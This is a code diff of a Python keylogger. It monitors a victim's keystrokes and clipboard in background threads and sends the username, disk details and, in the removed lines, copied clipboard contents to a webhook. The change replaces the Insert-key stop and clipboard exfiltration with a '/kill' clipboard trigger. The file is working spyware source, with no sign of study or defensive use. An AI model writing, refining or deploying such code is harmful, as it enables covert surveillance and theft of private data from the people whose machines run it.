@@ -91,24 +91,22 @@ def on_press(key):
 
 
 def on_release(key):
-    if key == keyboard.Key.insert:
-        send_to_webhook(f"Connection stopped by user: {username}")
-        file_path = rf"C:\users\{username}\kl2.1"  # Fixed the file path
-        subprocess.run(["explorer", file_path])
-        time.sleep(1)
-        send_to_webhook(f"Opened dir...")
-        return False
+    # No need for logic here anymore since we are monitoring the clipboard for '/kill'
+    pass
+
 
 def monitor_clipboard():
-    """Monitor the clipboard for changes and send the content to the webhook."""
+    """Monitor the clipboard for '/kill' and terminate the script when detected."""
     global last_clipboard
     while True:
         time.sleep(1)
         try:
             current_clipboard = pyperclip.paste()
             if current_clipboard != last_clipboard:
-                send_to_webhook(f" {username} just copied something to clipboard!")
-                send_to_webhook(f"Clipboard content: {current_clipboard}")
+                # Check if the clipboard contains '/kill'
+                if "/kill" in current_clipboard:
+                    send_to_webhook(f"Kill command detected in clipboard. Stopping the script...")
+                    break  # Break the loop to stop the script
                 last_clipboard = current_clipboard
         except Exception as e:
             print(f"Error accessing clipboard: {e}")
@@ -137,9 +135,4 @@ send_to_webhook(f"Disk info: Total: {disk_info.total}, Used: {disk_info.used}, F
 threading.Thread(target=keystroke_monitor, daemon=True).start()
 threading.Thread(target=monitor_clipboard, daemon=True).start()
 
-# Set up the keyboard listener
-try:
-    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-        listener.join()
-except KeyboardInterrupt:
-    print("Listener stopped.")
+# The script will continue running until '/kill' is found in the clipboard
